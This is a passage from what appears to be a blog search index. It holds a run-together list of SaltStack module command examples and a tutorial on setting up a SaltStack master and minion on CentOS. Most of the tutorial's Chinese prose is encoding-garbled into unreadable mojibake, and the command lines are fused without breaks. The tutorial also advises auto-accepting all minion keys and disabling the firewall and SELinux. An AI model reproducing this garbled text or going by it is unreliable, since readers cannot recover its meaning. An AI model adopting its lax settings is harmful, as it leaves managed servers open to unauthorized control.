â€˜*â€™ serverdensity_device.delete 51f7eafcdba4bb235e000ae4salt â€˜*â€™ serverdensity_device.get_sd_auth &lt;val&gt;salt â€˜*â€™ serverdensity_device.install_agent c2bbdd6689ff46282bdaa07555641498salt â€˜*â€™ serverdensity_device.lssalt â€˜*â€™ serverdensity_device.ls name=lamasalt â€˜*â€™ serverdensity_device.ls name=lama group=lama_band installedRAM=32768salt â€˜*â€™ serverdensity_device.update 51f7eafcdba4bb235e000ae4 name=lama group=lama_bandsalt â€˜*â€™ serverdensity_device.update 51f7eafcdba4bb235e000ae4 name=better_lama group=rock_lamas swapSpace=512salt â€˜*â€™ service.available sshdsalt â€˜*â€™ service.available sshd limit=upstartsalt â€˜*â€™ service.available sshd limit=sysvinitsalt â€˜*â€™ service.disable &lt;service name&gt;salt â€˜*â€™ service.disabled &lt;service name&gt;salt â€˜*â€™ service.enable &lt;service name&gt;salt â€˜*â€™ service.enabled &lt;service name&gt;salt â€˜*â€™ service.get_allsalt â€˜*â€™ service.get_all limit=upstartsalt â€˜*â€™ service.get_all limit=sysvinitsalt â€˜*â€™ service.get_disabledsalt â€˜*â€™ service.get_disabled limit=upstartsalt â€˜*â€™ service.get_disabled limit=sysvinitsalt â€˜*â€™ service.get_enabledsalt â€˜*â€™ service.get_enabled limit=upstartsalt â€˜*â€™ service.get_enabled limit=sysvinitsalt â€˜*â€™ service.missing sshdsalt â€˜*â€™ service.missing sshd limit=upstartsalt â€˜*â€™ service.missing sshd limit=sysvinitsalt â€˜*â€™ service.reload &lt;service name&gt;salt â€˜*â€™ service.restart &lt;service name&gt;salt â€˜*â€™ service.start &lt;service name&gt;salt â€˜*â€™ service.status &lt;service name&gt;salt â€˜*â€™ service.stop &lt;service name&gt;salt â€˜*â€™ shadow.default_hashsalt â€˜*â€™ shadow.del_password usernamesalt â€˜*â€™ shadow.gen_password â€˜I_am_passwordâ€™salt â€˜*â€™ shadow.gen_password â€˜I_am_passwordâ€™ crypt_saltâ€™I_am_saltâ€™ algorithm=sha256salt â€˜*â€™ shadow.info rootsalt â€˜*â€™ shadow.set_date username 0salt â€˜*â€™ shadow.set_expire username -1salt â€˜*â€™ shadow.set_inactdays username 7salt â€˜*â€™ shadow.set_maxdays username 90salt â€˜*â€™ shadow.set_mindays username 7salt â€˜*â€™ shadow.set_password root â€˜$1$UYCIxa628.9qXjpQCjM4a..â€™salt â€˜*â€™ shadow.set_warndays username 7salt â€˜*â€™ sqlite3.fetch /root/test.db â€˜SELECT * FROM test;â€™salt â€˜*â€™ sqlite3.indexes /root/test.dbsalt â€˜*â€™ sqlite3.indices /root/test.dbsalt â€˜*â€™ sqlite3.modify /root/test.db â€˜CREATE TABLE test(id INT, testdata TEXT);â€™salt â€˜*â€™ sqlite3.sqlite_versionsalt â€˜*â€™ sqlite3.tables /root/test.dbsalt â€˜*â€™ sqlite3.versionsalt â€˜*â€™ ssh.auth_keys rootsalt â€˜*â€™ ssh.check_key &lt;user&gt; &lt;key&gt; &lt;enc&gt; &lt;comment&gt; &lt;options&gt;salt â€˜*â€™ root salt://ssh/keyfilesalt â€˜*â€™ ssh.check_known_host &lt;user&gt; &lt;hostname&gt; key=â€™AAAAâ€¦FAaQ==â€™salt â€˜*â€™ ssh.get_known_host &lt;user&gt; &lt;hostname&gt;salt â€˜*â€™ ssh.hash_known_hostssalt â€˜*â€™ ssh.host_keyssalt â€˜*â€™ ssh.recv_known_host &lt;hostname&gt; enc=&lt;enc&gt; port=&lt;port&gt;salt â€˜*â€™ ssh.rm_auth_key &lt;user&gt; &lt;key&gt;salt â€˜*â€™ ssh.rm_known_host &lt;user&gt; &lt;hostname&gt;salt â€˜*â€™ ssh.set_auth_key &lt;user&gt; â€˜&lt;key&gt;â€™ enc=â€™dsaâ€™salt â€˜*â€™ ssh.set_auth_key_from_file &lt;user&gt; salt://ssh_keys/&lt;user&gt;.id_rsa.pubsalt â€˜*â€™ ssh.set_known_host &lt;user&gt; fingerprint=â€™xx:xx:..:xxâ€™ enc=â€™ssh-rsaâ€™ config=â€™.ssh/known_hostsâ€™salt â€˜*â€™ ssh.user_keyssalt â€˜*â€™ ssh.user_keys user=user1salt â€˜*â€™ ssh.user_keys user=user1 pubfile=/home/user1/.ssh/id_rsa.pub prvfile=/home/user1/.ssh/id_rsasalt â€˜*â€™ ssh.user_keys user=â€[â€˜user1â€²,â€™user2â€²] pubfile=id_rsa.pub prvfile=id_rsasalt â€˜*â€™ state.clear_cachesalt â€˜*â€™ state.high â€˜&#123;â€œvimâ€: &#123;â€œpkgâ€: [â€œinstalledâ€]&#125;&#125;â€™salt â€˜*â€™ state.highstatesalt â€˜*â€™ state.highstate whitelist=sls1_to_run,sls2_to_runsalt â€˜*â€™ state.highstate exclude=sls_to_excludesalt â€˜*â€™ state.highstate exclude=â€[&#123;â€˜id': â€˜id_to_excludeâ€™&#125;, &#123;â€˜sls': â€˜sls_to_excludeâ€™&#125;]â€salt â€˜*â€™ state.highstate pillar=â€&#123;foo: â€˜Foo!â€™, bar: â€˜Bar!â€™&#125;â€salt â€˜*â€™ state.low â€˜&#123;â€œstateâ€: â€œpkgâ€, â€œfunâ€: â€œinstalledâ€, â€œnameâ€: â€œviâ€&#125;â€™salt â€˜*â€™ state.pkg /tmp/state_pkg.tgzsalt â€˜*â€™ state.runningsalt â€˜*â€™ state.show_highstatesalt â€˜*â€™ state.show_low_sls foosalt â€˜*â€™ state.show_lowstatesalt â€˜*â€™ state.show_sls core,edit.vim devsalt â€˜*â€™ state.show_topsalt â€˜*â€™ state.single pkg.installed name=vimsalt â€˜*â€™ state.sls core,edit.vim devsalt â€˜*â€™ state.sls core exclude=â€[&#123;â€˜id': â€˜id_to_excludeâ€™&#125;, &#123;â€˜sls': â€˜sls_to_excludeâ€™&#125;]â€salt â€˜*â€™ state.sls myslsfile pillar=â€&#123;foo: â€˜Foo!â€™, bar: â€˜Bar!â€™&#125;â€salt â€˜*â€™ state.sls_id apache httpsalt â€˜*â€™ state.template â€˜&lt;Path to template on the minion&gt;â€™salt â€˜*â€™ state.template_str â€˜&lt;Template String&gt;â€™salt â€˜*â€™ state.top reverse_top.slssalt â€˜*â€™ state.top reverse_top.sls exclude=sls_to_excludesalt â€˜*â€™ state.top reverse_top.sls exclude=â€[&#123;â€˜id': â€˜id_to_excludeâ€™&#125;, &#123;â€˜sls': â€˜sls_to_excludeâ€™&#125;]â€salt â€˜*â€™ status.all_statussalt â€˜*â€™ status.cpuinfosalt â€˜*â€™ status.cpustatssalt â€˜*â€™ status.customsalt â€˜*â€™ status.diskstatssalt â€˜*â€™ status.diskusage [paths and/or filesystem types]salt â€˜*â€™ status.diskusage # usage for all filesystemssalt â€˜*â€™ status.diskusage / /tmp # usage for / and /tmpsalt â€˜*â€™ status.diskusage ext? # usage for ext[234] filesystemssalt â€˜*â€™ status.diskusage / ext? # usage for / and all ext filesystemssalt â€˜*â€™ status.loadavgsalt â€˜*â€™ status.mastersalt â€˜*â€™ status.meminfosalt â€˜*â€™ status.netdevsalt â€˜*â€™ status.netstatssalt â€˜*â€™ status.nprocsalt â€˜*â€™ status.pid &lt;sig&gt;salt â€˜*â€™ status.procssalt â€˜*â€™ status.uptimesalt â€˜*â€™ status.versionsalt â€˜*â€™ status.vmstatssalt â€˜*â€™ status.wsalt â€˜*â€™ supervisord.add &lt;name&gt;salt â€˜*â€™ supervisord.custom â€œmstop â€˜*gunicorn*'â€salt â€˜*â€™ supervisord.options foosalt â€˜*â€™ supervisord.remove &lt;name&gt;salt â€˜*â€™ supervisord.rereadsalt â€˜*â€™ supervisord.restart &lt;service&gt;salt â€˜*â€™ supervisord.restart &lt;group&gt;:salt â€˜*â€™ supervisord.start &lt;service&gt;salt â€˜*â€™ supervisord.start &lt;group&gt;:salt â€˜*â€™ supervisord.statussalt â€˜*â€™ supervisord.status_rawsalt â€˜*â€™ supervisord.stop &lt;service&gt;salt â€˜*â€™ supervisord.stop &lt;group&gt;:salt â€˜*â€™ supervisord.updatesalt â€˜*â€™ sys.argspec pkg.installsalt â€˜*â€™ sys.argspec syssalt â€˜*â€™ sys.argspecsalt â€˜*â€™ sys.docsalt â€˜*â€™ sys.doc syssalt â€˜*â€™ sys.doc sys.docsalt â€˜*â€™ sys.doc network.traceroute user.infosalt â€˜*â€™ sys.list_functionssalt â€˜*â€™ sys.list_functions syssalt â€˜*â€™ sys.list_functions sys usersalt â€˜*â€™ sys.list_modulessalt â€˜*â€™ sys.list_returner_functionssalt â€˜*â€™ sys.list_returner_functions mysqlsalt â€˜*â€™ sys.list_returner_functions mysql etcdsalt â€˜*â€™ sys.list_returnerssalt â€˜*â€™ sys.list_runner_functionssalt â€˜*â€™ sys.list_runner_functions statesalt â€˜*â€™ sys.list_runner_functions state virtsalt â€˜*â€™ sys.list_runnerssalt â€˜*â€™ sys.list_state_functionssalt â€˜*â€™ sys.list_state_functions filesalt â€˜*â€™ sys.list_state_functions pkg usersalt â€˜*â€™ sys.list_state_modulessalt â€˜*â€™ sys.reload_modulessalt â€˜*â€™ sys.returner_docsalt â€˜*â€™ sys.returner_doc sqlite3salt â€˜*â€™ sys.returner_doc sqlite3.get_funsalt â€˜*â€™ sys.returner_doc sqlite3.get_fun etcd.get_funsalt â€˜*â€™ sys.runner_docsalt â€˜*â€™ sys.runner_doc cachesalt â€˜*â€™ sys.runner_doc cache.grainssalt â€˜*â€™ sys.runner_doc cache.grains mine.getsalt â€˜*â€™ sys.state_docsalt â€˜*â€™ sys.state_doc servicesalt â€˜*â€™ sys.state_doc service.runningsalt â€˜*â€™ sys.state_doc service.running ipables.appendsalt â€˜*â€™ sysctl.assign net.ipv4.ip_forward 1salt â€˜*â€™ sysctl.get net.ipv4.ip_forwardsalt â€˜*â€™ sysctl.persist net.ipv4.ip_forward 1salt â€˜*â€™ sysctl.showsalt â€˜*â€™ system.haltsalt â€˜*â€™ system.init 3salt â€˜*â€™ system.poweroffsalt â€˜*â€™ system.rebootsalt â€˜*â€™ system.shutdownsalt â€˜*â€™ test.arg 1 â€œtwoâ€ 3.1 txt=â€helloâ€ wow='&#123;a: 1, b: â€œhelloâ€&#125;â€™salt â€˜*â€™ test.arg_repr 1 â€œtwoâ€ 3.1 txt=â€helloâ€ wow='&#123;a: 1, b: â€œhelloâ€&#125;â€™salt â€˜*â€™ test.arg_type 1 â€˜intâ€™salt â€˜*â€™ test.collatz 3salt â€˜*â€™ test.conf_testsalt â€˜*â€™ test.cross_test file.gid_to_group 0salt â€˜*â€™ test.echo â€˜foo bar baz quo quxâ€™salt â€˜*â€™ test.exception â€˜Oh noes!â€™salt â€˜*â€™ test.fib 3salt â€˜*â€™ test.get_optssalt â€˜*â€™ test.kwarg num=1 txt=â€twoâ€ env='&#123;a: 1, b: â€œhelloâ€&#125;â€™salt â€˜*â€™ test.not_loadedsalt â€˜*â€™ test.opts_pkgsalt â€˜*â€™ test.outputter foobarsalt â€˜*â€™ test.pingsalt â€˜*â€™ test.provider servicesalt â€˜*â€™ test.providerssalt â€˜*â€™ test.rand_sleep 60salt â€˜*â€™ test.rand_strsalt â€˜*â€™ test.retcode 42salt â€˜*â€™ test.sleep 20salt â€˜*â€™ test.stacksalt â€˜*â€™ test.tty tty0 â€˜This is a testâ€™salt â€˜*â€™ test.tty pts3 â€˜This is a testâ€™salt â€˜*â€™ test.versionsalt â€˜*â€™ test.versions_informationsalt â€˜*â€™ test.versions_reportsalt â€˜*â€™ timezone.get_hwclocksalt â€˜*â€™ timezone.get_offsetsalt â€˜*â€™ timezone.get_zonesalt â€˜*â€™ timezone.get_zonecodesalt â€˜*â€™ timezone.set_hwclock UTCsalt â€˜*â€™ timezone.set_zone â€˜America/Denverâ€™salt â€˜*â€™ timezone.zone_compare â€˜America/Denverâ€™salt â€˜*â€™ user.add name &lt;uid&gt; &lt;gid&gt; &lt;groups&gt; &lt;home&gt; &lt;shell&gt;salt â€˜*â€™ user.chfullname foo â€œFoo Barâ€salt â€˜*â€™ user.chgid foo 4376salt â€˜*â€™ user.chgroups foo wheel,root Truesalt â€˜*â€™ user.chhome foo /home/users/foo Truesalt â€˜*â€™ user.chhomephone foo â€œ7735551234â€salt â€˜*â€™ user.chroomnumber foo 123salt â€˜*â€™ user.chshell foo /bin/zshsalt â€˜*â€™ user.chuid foo 4376salt â€˜*â€™ user.chworkphone foo â€œ7735550123â€salt â€˜*â€™ user.delete name remove=True force=Truesalt â€˜*â€™ user.getentsalt â€˜*â€™ user.info rootsalt â€˜*â€™ user.list_groups foosalt â€˜*â€™ user.list_userssalt â€˜*â€™ virtualenv.create /path/to/new/virtualenvsalt â€˜*â€™ virtualenv.get_site_packages /path/to/my/venvsalt â€˜*â€™ webutil.useradd /etc/httpd/htpasswd larry badpasswordsalt â€˜*â€™ webutil.useradd /etc/httpd/htpasswd larry badpass opts=nssalt â€˜*â€™ webutil.useradd /etc/httpd/htpasswd larry badpasswordsalt â€˜*â€™ webutil.useradd /etc/httpd/htpasswd larry badpass opts=nssalt â€˜*â€™ webutil.userdel /etc/httpd/htpasswd larry","link":"/2015/12/10/è‡ªåŠ¨åŒ–+Jenkins/saltstack/æœåŠ¡è‡ªåŠ¨åŒ–éƒ¨ç½²å¹³å°ä¹‹Saltstackæ€»ç»“/"},{"title":"è‡ªåŠ¨åŒ–è¿ç»´å·¥å…·--Saltstackå®‰è£…éƒ¨ç½²é…ç½®ä½¿ç”¨","text":"è‡ªåŠ¨åŒ–è¿ç»´å·¥å…·â€“Saltstackå®‰è£…éƒ¨ç½²é…ç½®ä½¿ç”¨å‰è¨€ï¼š å¼€å§‹å­¦saltstackçš„æ—¶å€™æ˜¯åœ¨ç°åœ¨ä¸€å®¶åšCDNäº‘åŠ é€Ÿçš„é‚£æ˜¯åœ¨2014å¹´ï¼Œsaltåˆšåˆšå‡ºæ¥æ‰€ä»¥æˆ‘è§‰å¾—æˆ‘æ¥è§¦åº”è¯¥ä¹Ÿç®—æ—©çš„ã€‚ ä½¿ç”¨æœ€å¤šçš„åŒæ­¥ä¸‹å‘çš„ç”¨åˆ°è¿™ä¸ªå·¥å…·ï¼Œä¸‹é¢æˆ‘ç®€å•ä»‹ç»å’Œæ“ä½œç»™å¤§å®¶çœ‹ä¸‹ã€‚Salt å’Œ Puppet Chef ä¸€æ ·å¯ä»¥è®©ä½ åŒæ—¶åœ¨å¤šå°æœåŠ¡å™¨ä¸Šæ‰§è¡Œå‘½ä»¤ä¹ŸåŒ…æ‹¬å®‰è£…å’Œé…ç½®è½¯ä»¶ã€‚ Salt æœ‰ä¸¤ä¸ªä¸»è¦çš„åŠŸèƒ½ï¼šé…ç½®ç®¡ç†å’Œè¿œç¨‹æ‰§è¡Œã€‚ Saltstackæ˜¯ä¸€ä¸ªå¤§å‹åˆ†å¸ƒå¼çš„é…ç½®ç®¡ç†ç³»ç»Ÿï¼ˆå®‰è£…å‡çº§å¸è½½è½¯ä»¶ï¼Œæ£€æµ‹ç¯å¢ƒï¼‰ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œç³»ç»Ÿã€‚é€šè¿‡c/sçš„æ¨¡å‹å®ç°ã€‚æœåŠ¡å™¨ç«¯å¯¹è¿œç¨‹å®¢æˆ·æœºçš„æ“ä½œï¼š ###ï¼ˆä¸€ï¼‰éƒ¨ç½²è™šæ‹ŸåŒ–ç¯å¢ƒ ï¼ˆ1ï¼‰ä¸¤ç»„æœåŠ¡å™¨è¿›è¡Œï¼Œæ“ä½œç³»ç»Ÿç‰ˆæœ¬ä¸ºCentos release 6.4 RHEL ä¹Ÿå¯ä»¥ã€‚ ï¼ˆ2ï¼‰å®‰è£…è¿™ä¸ªå…ˆå®‰è£…ä¸‹epel ç”±äºç°åœ¨ç½‘ç»œRHELå®˜ç½‘yumæºè¿˜æ²¡æœ‰ saltstackçš„å®‰è£…åŒ…æ”¯æŒã€‚å› æ­¤å…ˆå®‰è£…epelä½œä¸ºéƒ¨ç½²saltstackçš„é»˜è®¤yumæºã€‚ CenOs 5 ç‰ˆæœ¬: rpm -Uvh ä¸‹è½½åœ°å€ï¼šhttp://ftp.linux.ncsu.edu/pud/epel/6/i386/epel-release-5-4.noarch.rpm CenOs 6 ç‰ˆæœ¬: rpm -Uvh ä¸‹è½½åœ°å€ï¼šhttp://ftp.linux.ncsu.edu/pud/epel/6/i386/epel-release-6-8.noarch.rpm ç™¾åº¦äº‘ä¹Ÿå¯ä»¥å»ä¸‹è½½ï¼Œæˆ‘çš„æ˜¯centos 64ä½çš„ http://pan.baidu.com/s/1eQGWboI (1) ä¸»æœåŠ¡å™¨ ï¼ˆä¸»æ§ç«¯ï¼‰ IPï¼š192.168.23.21 1234#rpm -ivh http://mirrors.sohu.com/fedora-epel/6/x86_64/epel-release-6-8.noarch.rpm#yum install salt-master -y ï¼ˆå®‰è£…salt-masterï¼‰#chkconfig salt-master on#service salt-master start (2)ä»æœåŠ¡å™¨å®‰è£… ï¼ˆè¢«æ§ç«¯ï¼‰IPï¼š192.168.23.24 123#yum install salt-minion -y ï¼ˆå®‰è£…salt-minionï¼‰#chkconfig salt-master on#service salt-master start åˆ°è¿™é‡Œå·²ç»å®‰è£…å®Œæˆã€‚ Saltstack é˜²ç«å¢™é…ç½® åœ¨ä¸»æ§ç«¯æ·»åŠ TCP 4505,TCP 4506 çš„è§„åˆ™ï¼Œè€Œåœ¨è¢«æ§ç«¯æ— é¡»é…ç½®é˜²ç«å¢™ï¼ŒåŸç†æ˜¯è¢«æ§ç«¯ç›´æ¥ä¸ä¸»æ§ç«¯çš„zerompå»ºç«‹é“¾æ¥ã€‚ æ¥æ”¶ å¹¿æ’­é“ä»»åŠ¡ä¿¡æ¯å¹¶æ‰§è¡Œï¼Œå…·ä½“æ“ä½œæ˜¯æ·»åŠ ä¸¤æ¡iptablesè§„åˆ™ï¼š 12-A INPUT -m state --state new -m tcp -p tcp --dport 4505 -j ACCEPT-A INPUT -m state --state new -m tcp -p tcp --dport 4506 -j ACCEPT é»˜è®¤é…ç½®æ–‡ä»¶ä½äº/etc/salt/master ï¼Œé»˜è®¤ä¸éœ€è¦æ›´æ”¹è¯¥é…ç½®æ–‡ä»¶ã€‚masterç«¯æœ‰ä¸¤ä¸ªç«¯å£éœ€è¦åœ¨iptablesä¸Šæ”¾è¡Œ. éƒ¨ç½²è¦æ±‚ï¼šä¸¤å°æœºå™¨ç½‘ç»œäº’é€šï¼Œæœ€å¥½å…³é—­é˜²ç«å¢™ã€‚å…³é—­selinux. åœ¨å¯åŠ¨ä¸‹æœåŠ¡ã€‚ æ›´æ–°Saltstack é…ç½®åŠå®‰è£…æ•ˆéªŒã€‚ Saltsatack åˆ†ä¸¤ç§ï¼Œä¸€ç§ä¸ºmaster (ä¸»æ§åˆ¶)ï¼Œå¦ä¸€ç«¯ä¸ºminion (è¢«æ§ç«¯)ï¼Œå®‰è£…å®Œæ¯•åéœ€è¦å¯¹ä¸¤ç§è§’è‰²çš„é…ç½®æ–‡ä»¶è¿›è¡Œä¿®æ”¹ã€‚ å…·ä½“è¯´æ˜å¦‚ä¸‹ï¼š ï¼ˆ1ï¼‰ master ä¸»æ§ç«¯é…ç½® 123456789 vim /etc/salt/master # ç»‘å®šMaster é€šä¿¡IPï¼› interface :192.168.23.21 #è‡ªåŠ¨è®¤è¯ï¼Œé¿å…æ‰‹åŠ¨è¿è¡Œsalt-key æ¥ç¡®è®¤è¯ä¹¦ä¿¡ä»»ï¼› auto-accept:True ä¿®æ”¹/etc/hostsä¸»æœºè¦æ·»åŠ è¢«æ§æœºå™¨çš„IP å’Œä¸»æœºå192.168.23.24 xx.rix.com æœåŠ¡ç«¯é…ç½® ä¸»æ§ç«¯åŸºæœ¬è®¾ç½® ç¼–è¾‘é…ç½®æ–‡ä»¶ /etc/salt/master,ä¿®æ”¹å¦‚ä¸‹æ‰€ç¤ºé…ç½®é¡¹ï¼Œå»æ‰å‰é¢çš„æ³¨é‡Šç¬¦ 123interface: 192.168.23.21log_file: /var/log/salt/master # è®°å½•ä¸»æ§ç«¯è¿è¡Œæ—¥å¿—key_logfile: /var/log/salt/key # è®°å½•è®¤è¯è¯ä¹¦æ—¥å¿— å®¢æˆ·ç«¯é…ç½® ä¿®æ”¹/etc/hosts ä¸»æœºè¦æ·»åŠ æœåŠ¡ç«¯æœºå™¨çš„IP å’Œä¸»æœºå 1192.168.23.21 salt å—æ§ç«¯åŸºæœ¬è®¾ç½® ç¼–è¾‘é…ç½®æ–‡ä»¶ /etc/salt/minion,ä¿®æ”¹å¦‚ä¸‹æ‰€ç¤ºé…ç½®é¡¹ï¼Œå»æ‰å‰é¢çš„æ³¨é‡Šç¬¦# 1234master: 192.168.23.21 # è®¾ç½®ä¸»æ§ç«¯è¿™é‡Œmasterè®¾ç½®ä¸»æ§ç«¯å¯ä»¥hostsåç§°ï¼š#master: saltå‰ææ˜¯è¦è®¾ç½®hosts. æˆ‘è¿™é‡Œç›´æ¥é…ç½®çš„æ˜¯ä¸»æœºåï¼Œä¹Ÿå¯ä»¥é…ç½®æˆIPåœ°å€ï¼Œå¦‚æœé…ç½®æˆä¸»æœºåçš„è¯ï¼Œå°±éœ€è¦åœ¨/etc/hostsæ–‡ä»¶ä¸­masterä¸»æœºå¯¹åº”çš„IP ï¼Œå¦‚æœä½¿ç”¨å†…éƒ¨DNSçš„ä¾‹å¤–ï¼Œå¯ä»¥åœ¨å†…éƒ¨DNSä¸Šçš„ç»Ÿä¸€é…ç½®ã€‚ åœ¨å…¶ä¸‹å¢åŠ ä¸€è¡Œå†…å®¹ä¸ºï¼š 1- id: tomcatA1 è¿™é‡Œæ˜¯æŒ‡å®šå½“å‰ä¸»æœºçš„idå·ï¼Œè¿™åœ¨åé¢masterè®¤è¯å’Œmasterè°ƒç”¨å‘½ä»¤æ‰§è¡Œæ—¶æ˜¾ç¤ºçš„åç§°ï¼Œå¯ä»¥æ ¹æ®å®é™…è¯†åˆ«éœ€è¦å¡«å†™ã€‚å¦å¤–éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä»¥ä¸Šä¸¤å¤„é…ç½®å†’å·åé¢éƒ½éœ€è¦æœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œä¸ç„¶ä¼šæŠ¥å¦‚ä¸‹é”™è¯¯ï¼š 12log_file: /var/log/salt/minion # è®°å½•å—æ§ç«¯è¿è¡Œæ—¥å¿—key_logfile: /var/log/salt/key # è®°å½•è®¤è¯è¯ä¹¦æ—¥å¿— ä¸»æ§ç«¯å’Œå—æ§ç«¯ å¯åŠ¨å„è‡ªçš„æœåŠ¡ï¼Œç¡®ä¿æœåŠ¡å¯åŠ¨åæ²¡æœ‰ä»»ä½•æŠ¥é”™ä¿¡æ¯,å¦‚æœå¼‚å¸¸è¯·æ£€æŸ¥ç›¸åº”æ—¥å¿—æ–‡ä»¶å¤„ç† 12ä¸»æ§ç«¯: service salt-master restartå—æ§ç«¯: service salt-minion restart saltstack ä¸»æ§ç«¯æ˜¯ä¾é opensslè¯ä¹¦æ¥ä¸å—æ§ç«¯ä¸»æœºè®¤è¯é€šè®¯çš„ï¼Œå—æ§ç«¯å¯åŠ¨åä¼šå‘é€ç»™ä¸»æ§ç«¯ä¸€ä¸ªå…¬é’¥è¯ä¹¦æ–‡ä»¶ï¼Œåœ¨ä¸»æ§ç«¯ç”¨ salt-key å‘½ä»¤æ¥ç®¡ç†è¯ä¹¦ã€‚ 123salt-key -L # ç”¨æ¥æŸ¥çœ‹è¯ä¹¦æƒ…å†µsalt-key -a æœåŠ¡ç«¯åç§°æˆ–IP # ç”¨æ¥ç®¡ç†æ¥å—è¯ä¹¦salt-key -A # ç”¨æ¥ç®¡ç†æ¥å—æ‰€æœ‰è®¤è¯ä¸»æœºçš„è®¤è¯ ä¸»æ§ç«¯å’Œè¢«æ§ç«¯çš„è¯ä¹¦é»˜è®¤éƒ½å­˜æ”¾åœ¨/etc/salt/pki/ ä¸­ï¼Œå¦‚æœé‡åˆ°è¯ä¹¦ä¸ç”Ÿæ•ˆçš„æƒ…å†µä¸‹ï¼Œå¯åœ¨ä¸»æ§ç«¯è¯ä¹¦å­˜æ”¾ç›®å½•åˆ é™¤å—æ§ç«¯è¯ä¹¦ï¼Œé‡æ–°è®¤è¯ä¸€ä¸‹ã€‚ 12345678910111213[root@ny-cloud-pagespeed00 ~]# salt-key -a 192.168.23.24The following keys are going to be accepted:Unaccepted Keys:192.168.23.24Proceed? [n/Y] y #è¿™é‡Œè¾“å…¥y ä»£è¡¨åŒæ„åŠ å…¥è¯ä¹¦ã€‚[root@ny-cloud-pagespeed00 minions]# salt -v \"xx.rix.com\" test.ping #è¿™é‡Œçš„.comæ˜¯å—æ§æœºçš„hostname è®¤è¯åç§°ã€‚Executing job with jid 20151004162442004183 -------------------------------------------xx.rix.com:True è¿™é‡Œå¯ä»¥è·å–åˆ°è®¤è¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬æŠŠè®¤è¯åŠ è¿›å»ã€‚ 123456789101112131415161718192021[root@salt ~]# salt-key -LAccepted Keys:Gateway1Gateway2ihaozhuo1ihaozhuo2nodeopenapireport1report2tomcat_A1tomcat_A2tomcat_B1tomcat_B2tomcat_bmwtomcat_C1tomcat_C2weixinDenied Keys:Unaccepted Keys:Rejected Keys: æˆ‘ä¸Šé¢ç”¨çš„-Aå‚æ•°ï¼Œè¯¥å‚æ•°æ„æ€æ˜¯æ¥å—æ‰€æœ‰è®¤è¯ä¸»æœºçš„è®¤è¯ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ -a idå åªè®¤è¯å•ç‹¬çš„ä¸»æœºã€‚é»˜è®¤è®¤è¯å®Œæˆåä¼šåœ¨/etc/salt/pki/master/minionsç›®å½•æ‰¾åˆ°ä»¥IDåå‘½ä»¤çš„æ–‡ä»¶ï¼Œé‡Œé¢å­˜æ”¾çš„æ˜¯å¯†é’¥æ–‡ä»¶ã€‚ å¦‚æœå¯¹å®¢æˆ·ç«¯ä¿¡ä»»ï¼Œå¯ä»¥è®©masterè‡ªåŠ¨æ¥å—è¯·æ±‚ï¼Œåœ¨masterç«¯/etc/salt/masteré…ç½®ã€‚ ï¼ˆäºŒï¼‰å‘½ä»¤æ‰§è¡ŒTrueä»£è¡¨æ­£å¸¸ï¼Œ*ä»£è¡¨æ‰€æœ‰ä¸»æœºï¼Œä¹Ÿå¯ä»¥é€‰æ‹©å•å°æˆ–è€…æŒ‰ç»„åŠæ­£åˆ™è¿›è¡ŒåŒ¹é…ç­‰ï¼Œè¿™ä¸ªå¯ä»¥å‚çœ‹ä¸‹å®˜æ–¹ç›¸å…³æ–‡æ¡£ ã€‚å…¶é»˜è®¤æ‰§è¡Œçš„æ­£åˆ™æ˜¯shellæ­£åˆ™ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æ­£åˆ™æˆ–ç»„ç­‰ï¼Œå¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334[root@salt ~]# salt '*' test.ping[root@salt ~]# salt '*' test.pingtomcat_C2: Truetomcat_B2: Trueihaozhuo1: Trueihaozhuo2: Trueopenapi: Truetomcat_B1: Truetomcat_C1: Trueweixin: Truetomcat_A1: Truetomcat_A2: Truenode: TrueGateway2: Truereport1: Truereport2: Truetomcat_bmw: TrueGateway1: Minion did not return. [Not connected] è¿™é‡Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€å°pingä¸é€šï¼Œå°±åº”è¯¥ä¸Šå»æŸ¥çœ‹ä¸‹ã€‚ 12345678[root@Gateway1 ~]# ps -ef | grep minionroot 15343 15168 0 11:22 pts/0 00:00:00 grep --color=auto minion[root@Gateway1 ~]# service salt-minion startRedirecting to /bin/systemctl start salt-minion.service[root@Gateway1 ~]# ps -ef | grep minionroot 15422 1 7 11:22 ? 00:00:00 /usr/bin/python /usr/bin/salt-minionroot 15431 15422 46 11:22 ? 00:00:00 /usr/bin/python /usr/bin/salt-minionroot 15494 15168 0 11:22 pts/0 00:00:00 grep --color=auto minion åŸæ¥æ˜¯è¿›ç¨‹æŒ‚äº†ï¼Œæ‰€æœ‰è¿™ä¹Ÿæ˜¯saltä»€ä¹ˆéƒ½å¥½å”¯ä¸€ä¸€ç‚¹ç¼ºç‚¹å°±æ˜¯éœ€è¦é…ç½®å®¢æˆ·ç«¯å¯åŠ¨æœåŠ¡ï¼Œè¿™æ ·å¯¹ç½‘ç»œä¼ è¾“ç­‰ç­‰éƒ½æœ‰è¦æ±‚æ¯”è¾ƒé«˜ã€‚ä¸€æ—¦è¿›ç¨‹æ­»äº†ï¼Œå‡ ç™¾å°ä»¥ä¸Šå¯èƒ½å°±æ¯”è¾ƒè´¹åŠ›ã€‚ 1234- salt 'shellæ­£åˆ™' å‘½ä»¤- salt -E 'prel æ­£åˆ™'- salt -N $group å‘½ä»¤- salt -L 'server_id1,server_id2,server_id3' å‘½ä»¤ 123456å¸¸ç”¨çš„æ“ä½œç±»ä¼¼å¦‚ä¸‹- salt '*' cmd.run \"ab -n 10 -c 2 http://www.google.com/\"- salt '*' grains.ls æŸ¥çœ‹grainsåˆ†ç±»- salt '*' grains.items æŸ¥çœ‹grainsæ‰€æœ‰ä¿¡æ¯- salt '*' grains.item osrelease æŸ¥çœ‹grainsæŸä¸ªä¿¡æ¯- salt '*' cmd.run \"/App/nginx/sbin/nginx 